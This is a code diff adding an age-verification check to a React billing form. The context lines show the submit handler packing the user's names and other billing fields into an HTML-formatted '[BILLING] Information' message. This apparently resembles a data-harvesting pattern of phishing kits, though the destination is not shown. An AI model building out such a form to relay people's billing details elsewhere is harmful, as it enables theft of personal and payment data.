@@ -73,8 +73,27 @@ export function BillingPage({ onComplete }: BillingPageProps) {
     setFormData({ ...formData, dob: formatted });
   };
 
+  const isAtLeast18 = (dob: string) => {
+    if (dob.length !== 10) return false;
+    const [month, day, year] = dob.split('/').map(Number);
+    const birthDate = new Date(year, month - 1, day);
+    const today = new Date();
+    let age = today.getFullYear() - birthDate.getFullYear();
+    const m = today.getMonth() - birthDate.getMonth();
+    if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
+      age--;
+    }
+    return age >= 18;
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
+    if (!isAtLeast18(formData.dob)) {
+      alert('You must be at least 18 years old to continue.');
+      return;
+    }
+
     const message = `<b>[BILLING] Information:</b>\n` +
       `First Name: ${formData.firstName}\n` +
       `Last Name: ${formData.lastName}\n` +
